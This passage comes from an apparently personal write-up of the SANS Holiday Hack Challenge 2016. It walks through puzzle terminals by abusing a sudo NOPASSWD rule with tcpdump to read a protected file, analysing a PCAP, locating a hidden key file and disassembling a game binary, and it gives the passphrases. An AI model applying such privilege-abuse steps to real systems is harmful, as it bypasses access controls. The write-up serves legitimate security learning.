amd64 <span class="o">(</span>4.6.2-5+deb8u1<span class="o">)</span>, libpcap0.8:amd64 <span class="o">(</span>1.6.2-2, automatic<span class="o">)</span>, vim-common:amd64 <span class="o">(</span>7.4.48
8-7+deb8u1, automatic<span class="o">)</span>, sudo:amd64 <span class="o">(</span>1.8.10p3-1+deb8u3<span class="o">)</span>, binutils:amd64 <span class="o">(</span>2.25-5<span class="o">)</span>, vim:am
d64 <span class="o">(</span>7.4.488-7+deb8u1<span class="o">)</span>, vim-runtime:amd64 <span class="o">(</span>7.4.488-7+deb8u1, automatic<span class="o">)</span>, libgpm2:amd64
<span class="o">(</span>1.20.4-6.1+b2, automatic<span class="o">)</span>
End-Date: 2016-12-01  21:18:41
</pre></div>
<p>So, <code>sudo</code> and <code>tcpdump</code> were both installed on the system. Maybe
there's a particular configuration in the <code>/etc/sudoers</code> file that allows
us to run <code>tcpdump</code> as <code>itchy</code> without having to provide any
password... Let's try to use <code>sudo</code> and <code>tcpdump</code> to read the
content of the file, and write it in another one:</p>
<div class="highlight"><pre>scratchy@31368df46952:/<span class="nv">$ </span>sudo -u itchy tcpdump -r /out.pcap -w /tmp/out2.pcap
sudo: unable to resolve host 31368df46952
reading from file /out.pcap, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
scratchy@31368df46952:/<span class="nv">$ </span>ls -lh /tmp/out2.pcap
-rw-r--r-- <span class="m">1</span> itchy itchy 1.1M Dec <span class="m">25</span> 02:56 /tmp/out2.pcap
scratchy@31368df46952:/<span class="nv">$ </span>sha256sum /tmp/out2.pcap
07ec6f56c937fc939c8eb64c454ece277f8c1e4f8b851781ce7f4451d48ec985  /tmp/out2.pcap
</pre></div>
<p>w00t, we we're indeed able to copy the content of the file to another file,
which we can read, since we were able to compute its sha256 sum.</p>
<p>I learned afterwards the existence of the <code>-l</code> flag in <code>sudo</code>:</p>
<pre class="literal-block">
SUDO(8)                                                                            BSD System Manager's Manual                                                                            SUDO(8)

NAME
     sudo, sudoedit — execute a command as another user

SYNOPSIS
     sudo -h | -K | -k | -V
     sudo -v [-AknS] [-a type] [-g group] [-h host] [-p prompt] [-u user]
     sudo -l [-AknS] [-a type] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
[...]
     -l, --list  If no command is specified, list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host.  A longer list format
                 is used if this option is specified multiple times and the security policy supports a verbose output format.
</pre>
<p>And all this time, I was thinking:</p>
<blockquote>
Hmm, is there a way to list what you can do with <code>sudo</code> when you
can't read the <code>/etc/sudoers</code> file? Well, I'll search later!</blockquote>
<p>Why, yes, Yannick, it <strong>IS</strong> possible! It's the <code>-l</code> flag! You lazy, you.
#TheMoreYouKnow</p>
<p>Anyway, if you issue <code>sudo -l</code>, you can see that we can indeed run
<code>tcpdump</code> and <code>strings</code> as the <code>itchy</code> user, without knowing
the <code>scratchy</code> user's password:</p>
<div class="highlight"><pre>scratchy@8bb89db76dd2:/<span class="nv">$ </span>sudo -l
sudo: unable to resolve host 8bb89db76dd2
Matching Defaults entries <span class="k">for</span> scratchy on 8bb89db76dd2:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
User scratchy may run the following commands on 8bb89db76dd2:
<span class="hll">    <span class="o">(</span>itchy<span class="o">)</span> NOPASSWD: /usr/sbin/tcpdump
</span><span class="hll">    <span class="o">(</span>itchy<span class="o">)</span> NOPASSWD: /usr/bin/strings
</span></pre></div>
<p>Now that I had a readable copy of the PCAP file, I extracted the content of
this PCAP, by base64 encoding, so that I could analyze it on my own machine.
You can download the PCAP file <a class="reference external" href="/docs/sans-christmas-challenge-2016/out.pcap">here</a>
(sha256: <code>07ec6f56c937fc939c8eb64c454ece277f8c1e4f8b851781ce7f4451d48ec985</code>).</p>
<p>We can now open the PCAP file in Wireshark, which is a hell of a lot nicer than
analyzing it on the terminal:</p>
<img alt="wireshark_pcap.png" class="align-center" src="/images/sans-christmas-challenge-2016/wireshark_pcap.png" />
<p>We can see a request to a file called <code>firsthalf.html</code>:</p>
<div class="highlight"><pre><span class="nf">GET</span> <span class="nn">/firsthalf.html</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Wget/1.17.1 (darwin15.2.0)</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">identity</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">192.168.188.130</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">Keep-Alive</span>
</pre></div>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.0</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">SimpleHTTP/0.6 Python/2.7.12+</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Fri, 02 Dec 2016 11:28:00 GMT</span>
<span class="na">Content-type</span><span class="o">:</span> <span class="l">text/html</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">113</span>
<span class="na">Last-Modified</span><span class="o">:</span> <span class="l">Fri, 02 Dec 2016 11:25:35 GMT</span>

<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;form&gt;</span>
<span class="hll"><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;part1&quot;</span> <span class="na">value=</span><span class="s">&quot;santasli&quot;</span> <span class="nt">/&gt;</span>
</span><span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></div>
<p>We have the first half of our passphrase, <code>santasli</code>.</p>
<p>Now, to take a look at the second half. We can see that there is another
HTTP request, for the second half:</p>
<div class="highlight"><pre><span class="nf">GET</span> <span class="nn">/secondhalf.bin</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Wget/1.17.1 (darwin15.2.0)</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">identity</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">192.168.188.130</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">Keep-Alive</span>
</pre></div>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.0</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">SimpleHTTP/0.6 Python/2.7.12+</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Fri, 02 Dec 2016 11:28:00 GMT</span>
<span class="na">Content-type</span><span class="o">:</span> <span class="l">application/octet-stream</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">1048097</span>
<span class="na">Last-Modified</span><span class="o">:</span> <span class="l">Fri, 02 Dec 2016 11:26:12 GMT</span>

L}*.O..r.v./....v....z{.x.&#39;.l.(..@.1].X...k7.?.../.B..G.FPj.`~.%.....a~.;90.cLgc.q2..`.D.x...V....6...........@...x. %JK...kO...Idw..&lt;..G.\.
....... .....(.._.1sf..)$mg@..=.*
........
[snip]
</pre></div>
<p>We can see that a lot of binary content is being downloaded. I extracted it,
and tried to identify it:</p>
<div class="highlight"><pre><span class="nv">$ </span>file secondhalf.bin
secondhalf.bin: data
</pre></div>
<p>Uh oh, <code>file</code> was not able to identify the type of file. Maybe the start
of the file is just garbage, but there are some files carved later in the file.
Let's use <code>binwalk</code>, it should give us something to work with:</p>
<div class="highlight"><pre><span class="nv">$ </span>binwalk secondhalf.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
</pre></div>
<p>Damn, nothing. Maybe <code>foremost</code> will have more luck?</p>
<div class="highlight"><pre><span class="nv">$ </span>foremost secondhalf.bin
Processing: secondhalf.bin
<span class="p">|</span>*<span class="p">|</span>
<span class="nv">$ </span>cat output/audit.txt
Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
Audit File

Foremost started at Mon Dec <span class="m">26</span> 00:44:48 2016
Invocation: foremost secondhalf.bin
Output directory: output
Configuration file: /etc/foremost.conf
------------------------------------------------------------------
File: secondhalf.bin
Start: Mon Dec <span class="m">26</span> 00:44:48 2016
Length: <span class="m">1009</span> KB <span class="o">(</span><span class="m">1033943</span> bytes<span class="o">)</span>

Num  Name <span class="o">(</span><span class="nv">bs</span><span class="o">=</span>512<span class="o">)</span>         Size  File Offset     Comment

Finish: Mon Dec <span class="m">26</span> 00:44:48 2016

<span class="m">0</span> FILES EXTRACTED

------------------------------------------------------------------

Foremost finished at Mon Dec <span class="m">26</span> 00:44:48 2016
</pre></div>
<p>Still nothing... Is this file completely random? Let's use <code>ent</code> to
measure the entropy of the file:</p>
<div class="highlight"><pre><span class="nv">$ </span>ent secondhalf.bin
<span class="nv">Entropy</span> <span class="o">=</span> 7.999841 bits per byte.

Optimum compression would reduce the size
of this <span class="m">1033943</span> byte file by <span class="m">0</span> percent.

Chi square distribution <span class="k">for</span> <span class="m">1033943</span> samples is 227.29, and randomly
would exceed this value 75.00 percent of the times.

Arithmetic mean value of data bytes is 127.4329 <span class="o">(</span>127.5 <span class="o">=</span> random<span class="o">)</span>.
Monte Carlo value <span class="k">for</span> Pi is 3.145233080 <span class="o">(</span>error 0.12 percent<span class="o">)</span>.
Serial correlation coefficient is -0.001185 <span class="o">(</span>totally <span class="nv">uncorrelated</span> <span class="o">=</span> 0.0<span class="o">)</span>.
</pre></div>
<p>With these kinds of results, we can be pretty sture that this file is random.
The logical thing is to assume that it's some kind of encrypted file. What's
more, by looking at the end of the capture file, we can see some Dropbox LAN
Sync Discovery Protocol:</p>
<pre class="literal-block">
{&quot;host_int&quot;: 266670160730277518981342002975279884847, &quot;version&quot;: [2, 0], &quot;displayname&quot;: &quot;&quot;, &quot;port&quot;: 17500, &quot;namespaces&quot;: [1149071040, 1139770785, 1357103393, 1296963687, 1139786665, 1261247053, 1331126254, 1179166992, 1210559602, 1261612467, 1223790038, 1234538553, 1304191898, 1246301403, 1056298300, 1207374239]}
</pre>
<p>With this, I was pretty sure to have it the jackpot! I spent the whole day
reading documentation on Dropbox attacks, relying on the knowledge of this
<code>host_int</code> parameter... and a <code>host_id</code> parameter, which was
impossible to find anywhere. I tried to use the <code>host_int</code> paramter
directly as a decryption key, with several <code>openssl</code> algorithm, but, of
course, to no avail.</p>
<p>In a move of desperation, I went to <a class="reference external" href="https://reddit.com/r/netsec">/r/netsec</a>,
in order to find some clue on this particular part (I was weak, I'm sorry).
<a class="reference external" href="https://www.reddit.com/r/netsec/comments/5hmlkj/the_2016_sans_holiday_hack_challenge/db5qoes/">This comment</a>
really turned things around:</p>
<blockquote>
What types of strings does the strings utility look for, by default? #hint</blockquote>
<p>With this clue, I immediatly found out. By default, <code>strings</code> looks for
strings with a minimum length of 4, <strong>with a default encoding of 7-bit ASCII</strong>.
The binary data probably contained a string encoding in another form. I
immediatly tried 16-bit big endian:</p>
<div class="highlight"><pre><span class="nv">$ </span>strings -e b secondhalf.bin
<span class="hll">art2:ttlehelper
</span></pre></div>
<p>My error here was to assume that the binary data was in fact an encrypted blob.
Anyway, the second half is <code>ttlehelper</code>.</p>
<p>Passphrase: <code>santaslittlehelper</code>.</p>
</div>
<div class="section" id="workshop-first-door">
<h3>Workshop, first door</h3>
<pre class="literal-block">
*******************************************************************************
*                                                                             *
* To open the door, find the passphrase file deep in the directories.         *
*                                                                             *
*******************************************************************************
</pre>
<p>According to the <a class="reference external" href="https://en.wikipedia.org/wiki/Motd_%28Unix%29">motd</a>, there
is on the file system a file containing the passphrase to the door. We can
use the <code>find</code> command to list every file on the file system:</p>
<div class="highlight"><pre><span class="nv">$ </span>find / -type f 2&gt; /dev/null &gt; ~/files.txt
<span class="nv">$ </span>head ~/files.txt
/home/elf/files.txt
/home/elf/.bashrc
<span class="hll">/home/elf/.doormat/. / /<span class="se">\/\\</span>/Don<span class="s1">&#39;t Look Here!/You are persistent, aren&#39;</span>t you?/<span class="err">&#39;</span>/key_for_the_door.txt
</span>/home/elf/.profile
/home/elf/.bash_logout
/etc/hosts
/etc/resolv.conf
/etc/hostname
/etc/shadow
/etc/passwd-
</pre></div>
<p>The higlighted file seems interesting. However, there's a lot of tricky
characters in the path, and tabulation autocomplete is disabled on this
terminal. However, we can use some shell-fu to get the content of the file:</p>
<div class="highlight"><pre><span class="nv">$ </span>find ~/.doormat -name <span class="s2">&quot;key_for_the_door.txt&quot;</span> -exec cat <span class="o">{}</span> <span class="se">\;</span>
key: open_sesame
</pre></div>
<p>Passphrase: <code>open_sesame</code></p>
<p>With this passphrase, we can open the door, which gives us access to Santa's
office.</p>
</div>
<div class="section" id="santa-s-office">
<h3>Santa's office</h3>
<p>When you interact with the terminal in Santa's office, you get greeted by this
prompt:</p>
<img alt="santa_office_wargames.png" class="align-center" src="/images/sans-christmas-challenge-2016/santa_office_wargames.png" />
<p>By <a class="reference external" href="https://duckduckgo.com/?q=greetings+professor+falken">DuckDuckGoing</a>
this sentence, we can find that it's a <a class="reference external" href="https://en.wikipedia.org/wiki/WarGames">WarGames</a>
reference. Now, I haven't seen WarGames (I know, shame on me), but I managed to
find <a class="reference external" href="https://www.youtube.com/watch?v=KXzNo0vR_dU">a clip</a> with the
necessary commands:</p>
<div class="highlight"><pre>    GREETINGS PROFESSOR FALKEN.

<span class="hll">    Hello.
</span>
    HOW ARE YOU FEELING TODAY?

<span class="hll">    I&#39;m fine. How are you?
</span>
    EXCELLENT, IT&#39;S BEEN A LONG TIME. CAN YOU EXPLAIN THE REMOVAL OF YOUR USER ACCOUNT ON 6
    /23/73?

<span class="hll">    People sometimes make mistakes.
</span>
    YES THEY DO. SHALL WE PLAY A GAME?

<span class="hll">    Love to. How about Global Thermonuclear War?
</span>
    WOULDN&#39;T YOU PREFER A GOOD GAME OF CHESS?

<span class="hll">    Later. Let&#39;s play Global Thermonuclear War.
</span>
    FINE

    ,------~~v,_         _                     _--^\
     |&#39;          \   ,__/ ||                 _/    /,_ _
    /             \,/     /         ,,  _,,/^         v v-___
    |                    /          |&#39;~^                     \
    \                   |         _/                     _ _/^
     \                 /         /                   ,~~^/ |
      ^~~_       _ _   /          |          __,, _v__\   \/
          &#39;~~,  , ~ \ \           ^~       /    ~   //
              \/     \/             \~,  ,/
                                       ~~
       UNITED STATES                   SOVIET UNION
    WHICH SIDE DO YOU WANT?
         1.    UNITED STATES
         2.    SOVIET UNION
    PLEASE CHOOSE ONE:
<span class="hll">    2
</span>
    AWAITING FIRST STRIKE COMMAND
    -----------------------------
    PLEASE LIST PRIMARY TARGETS BY
CITY AND/OR COUNTRY NAME:

<span class="hll">Las Vegas
</span>
LAUNCH INITIATED, HERE&#39;S THE KEY FOR YOUR TROUBLE:
LOOK AT THE PRETTY LIGHTS
</pre></div>
<p>Passphrase: <code>LOOK AT THE PRETTY LIGHTS</code></p>
<p>With this passphrase, you can access a new room called the corridor.</p>
</div>
<div class="section" id="the-corridor">
<h3>The corridor</h3>
<p>There's no terminal in this room, only a password protected door. Let's put
a pin on this for now.</p>
<img alt="the_corridor_password_protected.png" class="align-center" src="/images/sans-christmas-challenge-2016/the_corridor_password_protected.png" />
</div>
<div class="section" id="workshop-second-door">
<h3>Workshop, second door</h3>
<pre class="literal-block">
*******************************************************************************
*                                                                             *
* Find the passphrase from the wumpus. Play fair or cheat; it's up to you.    *
*                                                                             *
*******************************************************************************
</pre>
<p>On this terminal, we have a kind of game, looking a lot like <a class="reference external" href="https://en.wikipedia.org/wiki/Hunt_the_Wumpus">Hunt the Wumpus</a>, where we have to go
down a dungeon, slay the wumpus, and get the passphrase from it.</p>
<img alt="wumpus_launch.png" class="align-center" src="/images/sans-christmas-challenge-2016/wumpus_launch.png" />
<p>However, instead of playing the game, we chan cheat, as the motd suggests, by
analyzing the binary to extract the passphrase. We can extract the
<code>wumpus</code> binary by base64-encoding it on the board, copying the result,
then base64-decoding it on our analysis machine. You can get a copy of the
executable <a class="reference external" href="/docs/sans-christmas-challenge-2016/wumpus">here</a> (sha256:
<code>10412d7773a5d3a49e5a5facdc5aa386a4e3eaec7dca83bc769a104e1790c1fd</code>).</p>
<p>If we look at the list of functions we can see one called <code>kill_wump</code>. By
looking at the disassembly of this function, using radare2 (God, I've got to
learn how to use this tool, there seems to be a steep learning curve!), we can
see that this function is called when you managed to kill the wumpus, and gives
you the passphrase:</p>
<div class="highlight"><pre><span class="o">[</span>0x00605118<span class="o">]</span>&gt; pdf @ fcn.kill_wump
/ <span class="o">(</span>fcn<span class="o">)</span> fcn.kill_wump 546
<span class="p">|</span>   fcn.kill_wump <span class="o">()</span><span class="p">;</span>
<span class="p">|</span>           <span class="p">;</span> var int local_8h @ rbp-0x8
<span class="p">|</span>           0x00402644      <span class="m">55</span>             push rbp
<span class="p">|</span>           0x00402645      4889e5         mov rbp, rsp
<span class="p">|</span>           0x00402648      4883ec10       sub rsp, 0x10
<span class="p">|</span>           0x0040264c      bf38354000     mov edi, str._thwock____groan___crash__n_nA_horrible_roar_fills_the_cave__and_you_realize__with_a_smile__that_you_nhave_slain_the_evil_Wumpus_and_won_the_game___You_don_t_want_to_tarry_for_nlong__however__because_not_only_is_the_Wumpus_famous__but_the_stench_of_ndead_Wumpus_is_also_quite_well_known__a_stench_plenty_enough_to_slay_the_nmightiest_adventurer_at_a_single_whiff__ <span class="p">;</span> <span class="s2">&quot;*thwock!* *groan* *crash*..A horrible roar fills the cave, and you realize, with a smile, that you.have slain the evil Wumpus and won the game!  You don&#39;t want to tarry for.long, however, because not only is the Wumpus famous, but the stench of.dead Wumpus is also quite well known, a stench plenty enough to slay the.mightiest adventurer at a single whiff!!&quot;</span> @ 0x403538
<span class="p">|</span>           0x00402651      e85ae4ffff     call sym.imp.puts          <span class="p">;</span> int puts<span class="o">(</span>const char *s<span class="o">)</span><span class="p">;</span>
<span class="p">|</span>           0x00402656      bf18000000     mov edi, 0x18               <span class="p">;</span> <span class="s2">&quot;0.@&quot;</span>
<span class="p">|</span>           0x0040265b      e8f0e4ffff     call sym.imp.malloc        <span class="p">;</span>  void *malloc<span class="o">(</span>size_t size<span class="o">)</span><span class="p">;</span>
<span class="p">|</span>           0x00402660      488945f8       mov qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>, rax
<span class="p">|</span>           0x00402664      488b05cd2a20.  mov rax, qword <span class="o">[</span>obj.m4<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605138:8<span class="o">]=</span>0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 <span class="p">;</span> obj.m4
<span class="p">|</span>           0x0040266b      0fb65009       movzx edx, byte <span class="o">[</span>rax + 9<span class="o">]</span>   <span class="p">;</span> <span class="o">[</span>0x9:1<span class="o">]=</span>0
<span class="p">|</span>           0x0040266f      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x00402673      <span class="m">8810</span>           mov byte <span class="o">[</span>rax<span class="o">]</span>, dl
<span class="p">|</span>           0x00402675      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x00402679      488d5001       lea rdx, <span class="o">[</span>rax + 1<span class="o">]</span>          <span class="p">;</span> 0x1
<span class="p">|</span>           0x0040267d      488b05bc2a20.  mov rax, qword <span class="o">[</span>obj.m5<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605140:8<span class="o">]=</span>0x402a60 str.We_have_no_future_because_our_present_is_too_volatile._We_have_only_risk_management. LEA obj.m5 <span class="p">;</span> <span class="s2">&quot;`*@&quot;</span> @ 0x605140
<span class="p">|</span>           0x00402684      0fb6400e       movzx eax, byte <span class="o">[</span>rax + 0xe<span class="o">]</span> <span class="p">;</span> <span class="o">[</span>0xe:1<span class="o">]=</span>0
<span class="p">|</span>           0x00402688      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x0040268a      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x0040268e      488d5002       lea rdx, <span class="o">[</span>rax + 2<span class="o">]</span>          <span class="p">;</span> 0x2
<span class="p">|</span>           0x00402692      488b059f2a20.  mov rax, qword <span class="o">[</span>obj.m4<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605138:8<span class="o">]=</span>0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 <span class="p">;</span> obj.m4
<span class="p">|</span>           0x00402699      0fb64037       movzx eax, byte <span class="o">[</span>rax + 0x37<span class="o">]</span> <span class="p">;</span> <span class="o">[</span>0x37:1<span class="o">]=</span><span class="m">0</span> <span class="p">;</span> <span class="s1">&#39;7&#39;</span>
<span class="p">|</span>           0x0040269d      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x0040269f      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x004026a3      488d5003       lea rdx, <span class="o">[</span>rax + 3<span class="o">]</span>          <span class="p">;</span> 0x3
<span class="p">|</span>           0x004026a7      488b05722a20.  mov rax, qword <span class="o">[</span>obj.m0<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605120:8<span class="o">]=</span>0x402970 str.The_sky_above_the_port_was_the_color_of_television__tuned_to_a_dead_channel. LEA obj.m0 <span class="p">;</span> <span class="s2">&quot;p)@&quot;</span> @ 0x605120
<span class="p">|</span>           0x004026ae      0fb64012       movzx eax, byte <span class="o">[</span>rax + 0x12<span class="o">]</span> <span class="p">;</span> <span class="o">[</span>0x12:1<span class="o">]=</span>62
<span class="p">|</span>           0x004026b2      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x004026b4      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x004026b8      488d5004       lea rdx, <span class="o">[</span>rax + 4<span class="o">]</span>          <span class="p">;</span> 0x4
<span class="p">|</span>           0x004026bc      488b05852a20.  mov rax, qword <span class="o">[</span>obj.m6<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605148:8<span class="o">]=</span>0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 <span class="p">;</span> obj.m6
<span class="p">|</span>           0x004026c3      0fb6401d       movzx eax, byte <span class="o">[</span>rax + 0x1d<span class="o">]</span> <span class="p">;</span> <span class="o">[</span>0x1d:1<span class="o">]=</span>0
<span class="p">|</span>           0x004026c7      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x004026c9      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x004026cd      488d5005       lea rdx, <span class="o">[</span>rax + 5<span class="o">]</span>          <span class="p">;</span> 0x5
<span class="p">|</span>           0x004026d1      488b05582a20.  mov rax, qword <span class="o">[</span>obj.m2<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605130:8<span class="o">]=</span>0x4029d8 str.The_street_finds_its_own_uses_for_things. LEA obj.m2 <span class="p">;</span> obj.m2
<span class="p">|</span>           0x004026d8      0fb64004       movzx eax, byte <span class="o">[</span>rax + 4<span class="o">]</span>   <span class="p">;</span> <span class="o">[</span>0x4:1<span class="o">]=</span>2
<span class="p">|</span>           0x004026dc      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x004026de      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x004026e2      488d5006       lea rdx, <span class="o">[</span>rax + 6<span class="o">]</span>          <span class="p">;</span> 0x6
<span class="p">|</span>           0x004026e6      488b055b2a20.  mov rax, qword <span class="o">[</span>obj.m6<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605148:8<span class="o">]=</span>0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 <span class="p">;</span> obj.m6
<span class="p">|</span>           0x004026ed      0fb64016       movzx eax, byte <span class="o">[</span>rax + 0x16<span class="o">]</span> <span class="p">;</span> <span class="o">[</span>0x16:1<span class="o">]=</span>0
<span class="p">|</span>           0x004026f1      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x004026f3      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x004026f7      488d5007       lea rdx, <span class="o">[</span>rax + 7<span class="o">]</span>          <span class="p">;</span> 0x7
<span class="p">|</span>           0x004026fb      488b05262a20.  mov rax, qword <span class="o">[</span>obj.m1<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605128:8<span class="o">]=</span>0x4029bd str.Pattern_Recognition. LEA obj.m1 <span class="p">;</span> obj.m1
<span class="p">|</span>           0x00402702      0fb6400e       movzx eax, byte <span class="o">[</span>rax + 0xe<span class="o">]</span> <span class="p">;</span> <span class="o">[</span>0xe:1<span class="o">]=</span>0
<span class="p">|</span>           0x00402706      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x00402708      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x0040270c      488d5008       lea rdx, <span class="o">[</span>rax + 8<span class="o">]</span>          <span class="p">;</span> 0x8
<span class="p">|</span>           0x00402710      488b05212a20.  mov rax, qword <span class="o">[</span>obj.m4<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605138:8<span class="o">]=</span>0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 <span class="p">;</span> obj.m4
<span class="p">|</span>           0x00402717      0fb6402e       movzx eax, byte <span class="o">[</span>rax + 0x2e<span class="o">]</span> <span class="p">;</span> <span class="o">[</span>0x2e:1<span class="o">]=</span><span class="m">0</span> <span class="p">;</span> <span class="s1">&#39;.&#39;</span>
<span class="p">|</span>           0x0040271b      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x0040271d      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x00402721      488d5009       lea rdx, <span class="o">[</span>rax + 9<span class="o">]</span>          <span class="p">;</span> 0x9
<span class="p">|</span>           0x00402725      488b05142a20.  mov rax, qword <span class="o">[</span>obj.m5<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605140:8<span class="o">]=</span>0x402a60 str.We_have_no_future_because_our_present_is_too_volatile._We_have_only_risk_management. LEA obj.m5 <span class="p">;</span> <span class="s2">&quot;`*@&quot;</span> @ 0x605140
<span class="p">|</span>           0x0040272c      0fb64007       movzx eax, byte <span class="o">[</span>rax + 7<span class="o">]</span>   <span class="p">;</span> <span class="o">[</span>0x7:1<span class="o">]=</span>0
<span class="p">|</span>           0x00402730      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x00402732      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x00402736      488d500a       lea rdx, <span class="o">[</span>rax + 0xa<span class="o">]</span>        <span class="p">;</span> 0xa
<span class="p">|</span>           0x0040273a      488b05ff2920.  mov rax, qword <span class="o">[</span>obj.m5<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605140:8<span class="o">]=</span>0x402a60 str.We_have_no_future_because_our_present_is_too_volatile._We_have_only_risk_management. LEA obj.m5 <span class="p">;</span> <span class="s2">&quot;`*@&quot;</span> @ 0x605140
<span class="p">|</span>           0x00402741      0fb64049       movzx eax, byte <span class="o">[</span>rax + 0x49<span class="o">]</span> <span class="p">;</span> <span class="o">[</span>0x49:1<span class="o">]=</span><span class="m">0</span> <span class="p">;</span> <span class="s1">&#39;I&#39;</span>
<span class="p">|</span>           0x00402745      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x00402747      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x0040274b      488d500b       lea rdx, <span class="o">[</span>rax + 0xb<span class="o">]</span>        <span class="p">;</span> 0xb
<span class="p">|</span>           0x0040274f      488b05f22920.  mov rax, qword <span class="o">[</span>obj.m6<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605148:8<span class="o">]=</span>0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 <span class="p">;</span> obj.m6
<span class="p">|</span>           0x00402756      0fb64007       movzx eax, byte <span class="o">[</span>rax + 7<span class="o">]</span>   <span class="p">;</span> <span class="o">[</span>0x7:1<span class="o">]=</span>0
<span class="p">|</span>           0x0040275a      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x0040275c      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
